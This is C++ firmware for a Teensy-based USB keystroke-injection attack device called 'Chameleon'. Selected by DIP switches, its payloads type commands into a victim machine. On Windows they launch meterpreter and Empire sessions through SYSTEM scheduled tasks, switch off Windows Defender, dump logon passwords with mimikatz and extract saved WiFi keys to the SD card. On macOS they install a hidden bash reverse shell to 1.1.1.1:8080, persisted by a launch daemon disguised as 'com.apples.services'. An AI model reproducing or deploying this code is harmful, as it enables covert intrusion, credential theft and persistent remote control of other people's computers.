/*

Chameleon, by Alex McCulloch. 

A multipayload rubber ducky clone. 

Started off as a modification of the Peensy project, turned into more of its own thing. 
https://github.com/offensive-security/hid-backdoor-peensy, 
https://www.offensive-security.com/offsec/advanced-teensy-penetration-testing-payloads/

Ported some ducky scripts from Hak5. https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads. 
And ported some output code from the Kautilya project. https://github.com/samratashok/Kautilya

*/

#include <usb_private.h>
#include <SD.h>
#include <SD_t3.h>

const int sd_chip_select = 0; // for Teensy 2.0 SD storage
Sd2Card card;
SdVolume volume;
SdFile root;
SdFile file;

// DIP switch pin initialisation
 unsigned int p1 = 10; 
 unsigned int p2 = 9;
 unsigned int p3 = 8;

// Teensy has LED on 11
const int led_pin = 11; 

// Wait for Windows to be ready before we start typing.
void wait_for_drivers(unsigned int speed)
{
  bool numLockTrap = is_num_on();
  while(numLockTrap == is_num_on())
  {
    blink_fast(5,80);
    press_numlock();
    unpress_key();
    delay(speed);
  }
  press_numlock();
  unpress_key();
  delay(speed);
}

// NUM Led keys checking. 
int ledkeys(void) {return int(keyboard_leds);}
bool is_num_on(void) {return ((ledkeys() & 1) == 1) ? true : false;}

void unpress_key(void)
{
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(500);
}

void blink_fast(unsigned int blinkrate,unsigned int delaytime)
{
  unsigned int blinkcounter=0;
  for(blinkcounter=0; blinkcounter!=blinkrate; blinkcounter++)
  {
    digitalWrite(led_pin, HIGH);
    delay(delaytime);
    digitalWrite(led_pin, LOW);
    delay(delaytime);
  }
}

void alt_y(void)
{
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.set_key1(KEY_Y);
  Keyboard.send_now();
  delay(100);
  unpress_key();
}

void alt_f4(void)
{
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.set_key1(KEY_F4);
  Keyboard.send_now();
  delay(100);
  unpress_key();
}

// Attempts to open an admin cmd prompt (reps) times, with (millisecs) milliseconds between each attempt. 
// Minimal reasonable values are : cmd_admin(3,700);
bool cmd_admin(unsigned int reps, unsigned int millisecs)
{
  make_sure_numlock_is_off();
  delay(700);
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.send_now();
  delay(1500);
  Keyboard.print("cmd");
  delay(1500);
  Keyboard.set_modifier(MODIFIERKEY_CTRL);
  Keyboard.send_now();
  Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  delay(200);
  unpress_key();
  delay(1500);
  alt_y();
  delay(1500);
  Keyboard.println(F(""));
  delay(400);
  create_click_numlock_win();
  check_for_numlock_sucess_teensy(reps,millisecs);
}

// A Teensy side check for a pressed numlock key. Will check for a pressed numlock key (reps) times, with (millisecs) milliseconds in between checks.
// The "reps" and millisecs" variables are fed to this function from other functions that require timing. For example:
// check_for_powershell(3,500);  
// download_powershell("http://172.16.1.2/remotefile.exe","localfile.exe",20,1000);
bool check_for_numlock_sucess_teensy(unsigned int reps, unsigned int millisecs)
{
  unsigned int i = 0;
  do
  {
    delay(millisecs);
    if (is_num_on())
    {
      make_sure_numlock_is_off();
      delay(700);
      return true;
    }
    i++;
  }
  while (!is_num_on() && (i<reps));
  return false;
}

// Dumps and executes a vbscript to the Windows File System that programatically presses the NUMLOCK key.
void create_click_numlock_win()
{
  blink_fast(3,80);
  Keyboard.println(F("echo Set WshShell = WScript.CreateObject(\"WScript.Shell\"): WshShell.SendKeys \"{NUMLOCK}\"' > numlock.vbs"));
  delay(400);
  Keyboard.println(F("cscript numlock.vbs"));
  delay(200);
}

// Minimises all windows 3 times with (sleep) milliseconds in between. used on failure of CMD opening.
void minimise_windows(void)
{
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  Keyboard.set_key1(KEY_M);
  Keyboard.send_now();
  delay(300);
  unpress_key();
  delay(300);
}

void press_numlock(void)
{
  Keyboard.set_key1(KEY_NUM_LOCK);
  Keyboard.send_now();
  delay(200);
}

void make_sure_numlock_is_off(void)
{
  if (is_num_on())
  {
    delay(500);
    press_numlock();
    delay(200);
    unpress_key();
    delay(700);
  }
}

// Preforms a Windows copy operation from the attached FAT formatted SD drive to the target machine. The drive VOLUME NAME is also taken as a parameter. For example:
// wincopy_from_sd_card("hstart64.exe" ,"hstart.exe","PAYLOAD");
// Presses numlock on success. Can only be used when the Teensy is loaded as a "Disk (SD Card) + Keyboard"
bool wincopy_from_sd_card(char *source,char *destination, char *volumename, unsigned int reps, unsigned int millisecs)
{
  delay(200);
  //make_sure_numlock_is_off();
  Keyboard.print(F("for /F \%i in ('WMIC logicaldisk where \"DriveType=2\" list brief ^| find \""));
  Keyboard.print(volumename);
  Keyboard.print(F("\"') do copy /Y \%i\\"));
  Keyboard.print(source);
  Keyboard.print(" ");
  Keyboard.println(destination);
  delay(200);
  //Keyboard.println(F("cscript numlock.vbs"));
  //delay(700);
  //return check_for_numlock_sucess_teensy(reps,millisecs);
}

// returns 1 on successful Teensy SD card init. 
bool init_sd_card(void) { return (card.init(SPI_HALF_SPEED, sd_chip_select) && volume.init(&card) && root.openRoot(&volume)) ? true : false;}  

void initVictim(void)
{
  if (!init_sd_card()){Serial.println("SDCARD FAIL");}
  wait_for_drivers(2000);
  delay(200);
  
  while (!cmd_admin(3,500))
  {
    delay(2000);
    minimise_windows();
  }

  delay(500);
}

void toggleDefender(void)
{
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.send_now();
  delay(1500);
  Keyboard.print("Windows Defender Settings");
  delay(1500);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  delay(200);
  unpress_key();
  delay(200);
  Keyboard.set_key1(KEY_TAB);
  Keyboard.send_now();
  delay(200);
  unpress_key();
  delay(200);
  Keyboard.set_key1(KEY_SPACE);
  Keyboard.send_now();
  delay(200);
  unpress_key();
  delay(200);
  alt_f4();
}

void performMimikatz(void)
{
  delay(300);
  Keyboard.println(F("powershell"));
  delay(700);

  // For loop to find drive letter
  Keyboard.println(F("$letter = Get-WmiObject Win32_Volume -Filter \"Label='CHAMELEON'\" | select -expand driveletter"));
  
  // extract the exe
  Keyboard.println(F("$shell = new-object -com shell.application"));
  Keyboard.println(F("$zip = $shell.NameSpace(\"$letter\\mimikatz.zip\")"));
  Keyboard.println(F("foreach($item in $zip.items())"));
  delay(200);
  Keyboard.println(F("{"));
  delay(200);
  Keyboard.println(F("$shell.Namespace($env:temp).copyhere($item)"));
  delay(200);
  Keyboard.println(F("}"));  
  delay(700);

  // Start mimikatz
  Keyboard.println(F("Invoke-Expression \"$env:temp\\mimikatz.exe\""));
  delay(700);

  // Dump contents to file
  Keyboard.println(F("privilege::debug"));
  delay(200);
  Keyboard.println(F("log \"C:\\other.log\""));
  delay(200);
  Keyboard.println(F("sekurlsa::logonpasswords"));
  delay(1000);
  Keyboard.println(F("exit"));
  delay(700);
  
  // Move file to SD card with date
  Keyboard.println(F("$filename = $env:COMPUTERNAME + \"-Passwords$((get-date).tostring(\"MMddyyyyHHmmss\")).txt\""));
  delay(700);
  Keyboard.println(F("Move-Item \"C:\\other.log\" \"$letter\\$filename\""));
  delay(200);
  
  // Delete mimimkatz 
  Keyboard.println(F("Remove-Item \"$env:temp\\mimikatz.exe\""));
  delay(200);

  // Exit Powershell
  Keyboard.println(F("exit"));
  delay(200);
}

// Initialise the DIP switch pins.
void init_dip_switch(void)
{
  pinMode(p1, INPUT_PULLUP);
  pinMode(p2, INPUT_PULLUP);
  pinMode(p3, INPUT_PULLUP);
}

// Main body of execution
void setup(void)
{
  Serial.begin(9600);
  init_dip_switch();

  // Dip switch 001 - Windows, Configure and start meterpreter and Empire sessions
  if (digitalRead(p3) && digitalRead(p2) && !digitalRead(p1)) 
  {
    initVictim();

    // startEmpire
    wincopy_from_sd_card("PE.bat" ,"%WINDIR%\\PE.bat","CHAMELEON",3,200);
    delay(700);
    Keyboard.println(F(""));
    Keyboard.println(F("schtasks /create /ru SYSTEM /sc HOURLY /MO 12 /tn Diag /tr \"'cmd' /c start '' '%WINDIR%\\PE.bat'\""));
    delay(300);
    Keyboard.println(F("schtasks /run /tn Diag"));
    delay(300);

    // start meterpreter
    wincopy_from_sd_card("msf.bat" ,"%WINDIR%\\msf.bat","CHAMELEON",3,200);
    delay(700);
    Keyboard.println(F(""));
    Keyboard.println(F("schtasks /create /ru SYSTEM /sc HOURLY /MO 12 /tn Maint /tr \"'cmd' /c start '' '%WINDIR%\\msf.bat'\""));
    delay(300);
    Keyboard.println(F("schtasks /run /tn Maint"));
    delay(300);

    alt_f4();
  }

  // Dip switch 010 - Windows, mimikatz dump
  if (digitalRead(p3) && !digitalRead(p2) && digitalRead(p1))  
  {
    initVictim();
    toggleDefender();
    performMimikatz(); 
    alt_f4();
    toggleDefender();
  }

  // Dip switch 011 - Windows, dump all saved wifi passwords
  if (digitalRead(p3) && !digitalRead(p2) && !digitalRead(p1)) 
  {
    initVictim();

    delay(700);
    Keyboard.println(F("powershell"));
    delay(700);
    Keyboard.println(F("$filename = $env:COMPUTERNAME + \"-WLAN-Keys$((get-date).tostring(\"MMddyyyyHHmmss\")).txt\""));
    delay(700);
    Keyboard.println(F("netsh wlan show profiles | Select-String -Pattern \"All User Profile\" | foreach {$_.ToString()} | foreach {$_.Replace(\"    All User Profile     : \",$null)} | foreach {netsh wlan show profiles name=\"$_\" key=clear} > $env:temp\\$filename"));
    delay(2000);
    Keyboard.println(F("$letter = Get-WmiObject Win32_Volume -Filter \"Label='CHAMELEON'\" | select -expand driveletter"));
    delay(200);
    Keyboard.println(F("Move-Item \"$env:temp\\$filename\" \"$letter\\$filename\""));
    delay(200);
    Keyboard.println(F("exit"));
    delay(1000);
    
    alt_f4();
  }

  // Dip switch 100 - Mac, configure root backdoor
  if (!digitalRead(p3) && digitalRead(p2) && digitalRead(p1)) 
  {
    delay(2000);
    Keyboard.println(F(""));
    delay(400);
    Keyboard.println(F("mount -uw /"));
    delay(2000);
    Keyboard.println(F("mkdir /Library/.hidden"));
    delay(200);
    Keyboard.println(F("echo '#!/bin/bash"));
    Keyboard.println(F("bash -i >& /dev/tcp/1.1.1.1/8080 0>&1")); //Replace 1.1.1.1/8080 with ip/port of your server listening with netcat
    Keyboard.println(F("wait' > /Library/.hidden/connect.sh"));
    delay(500);
    Keyboard.println(F("chmod +x /Library/.hidden/connect.sh"));
    delay(200);
    Keyboard.println(F("mkdir /Library/LaunchDaemons"));
    delay(200);
    Keyboard.println(F("echo '<plist version=\"1.0\">"));
    Keyboard.println(F("<dict>"));
    Keyboard.println(F("<key>Label</key>"));
    Keyboard.println(F("<string>com.apples.services</string>"));
    Keyboard.println(F("<key>ProgramArguments</key>"));
    Keyboard.println(F("<array>"));
    Keyboard.println(F("<string>/bin/sh</string>"));
    Keyboard.println(F("<string>/Library/.hidden/connect.sh</string>"));
    Keyboard.println(F("</array>"));
    Keyboard.println(F("<key>RunAtLoad</key>"));
    Keyboard.println(F("<true/>"));
    Keyboard.println(F("<key>StartInterval</key>"));
    Keyboard.println(F("<integer>60</integer>"));
    Keyboard.println(F("<key>AbandonProcessGroup</key>"));
    Keyboard.println(F("<true/>"));
    Keyboard.println(F("</dict>"));
    Keyboard.println(F("</plist>' > /Library/LaunchDaemons/com.apples.services.plist"));
    delay(500);
    Keyboard.println(F("chmod 600 /Library/LaunchDaemons/com.apples.services.plist"));
    delay(200);
    Keyboard.println(F("launchctl load /Library/LaunchDaemons/com.apples.services.plist"));
    delay(1000);
    Keyboard.println(F("shutdown -h now"));
  }

  // Dip switch 101 - Mac, configure user backdoor
  if (!digitalRead(p3) && digitalRead(p2) && !digitalRead(p1)) 
  {
    delay(1000);

    Keyboard.set_modifier(MODIFIERKEY_GUI);
    Keyboard.set_key1(KEY_SPACE);
    Keyboard.send_now();
    delay(200);
    unpress_key();

    delay(3000);
    Keyboard.print("terminal");
    delay(3000);
    
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(200);
    unpress_key();
    delay(200);

    delay(3000);
    Keyboard.println(F("mkdir ~/Library/.hidden"));
    delay(200);
    Keyboard.println(F("echo '#!/bin/bash"));
    Keyboard.println(F("bash -i >& /dev/tcp/1.1.1.1/8080 0>&1")); //Replace 1.1.1.1/8080 with ip/port of your server listening with netcat
    Keyboard.println(F("wait' > ~/Library/.hidden/connect.sh"));
    delay(500);
    Keyboard.println(F("chmod +x ~/Library/.hidden/connect.sh"));
    delay(200);
    Keyboard.println(F("mkdir ~/Library/LaunchAgents"));
    delay(200);
    Keyboard.println(F("echo '<plist version=\"1.0\">"));
    Keyboard.println(F("<dict>"));
    Keyboard.println(F("<key>Label</key>"));
    Keyboard.println(F("<string>com.apples.services</string>"));
    Keyboard.println(F("<key>ProgramArguments</key>"));
    Keyboard.println(F("<array>"));
    Keyboard.println(F("<string>/bin/sh</string>"));
    Keyboard.println(F("<string>'$HOME'/Library/.hidden/connect.sh</string>"));
    Keyboard.println(F("</array>"));
    Keyboard.println(F("<key>RunAtLoad</key>"));
    Keyboard.println(F("<true/>"));
    Keyboard.println(F("<key>StartInterval</key>"));
    Keyboard.println(F("<integer>300</integer>"));
    Keyboard.println(F("<key>AbandonProcessGroup</key>"));
    Keyboard.println(F("<true/>"));
    Keyboard.println(F("</dict>"));
    Keyboard.println(F("</plist>' > ~/Library/LaunchAgents/com.apples.services.plist"));
    delay(200);
    Keyboard.println(F("chmod 600 ~/Library/LaunchAgents/com.apples.services.plist"));
    delay(200);
    Keyboard.println(F("launchctl load ~/Library/LaunchAgents/com.apples.services.plist"));
    delay(200);

    Keyboard.set_modifier(MODIFIERKEY_GUI);
    Keyboard.set_key1(KEY_Q);
    Keyboard.send_now();
    delay(100);
    unpress_key();
  }

  // Blink light to show finished
  blink_fast(150,30);
}

void loop(void){}













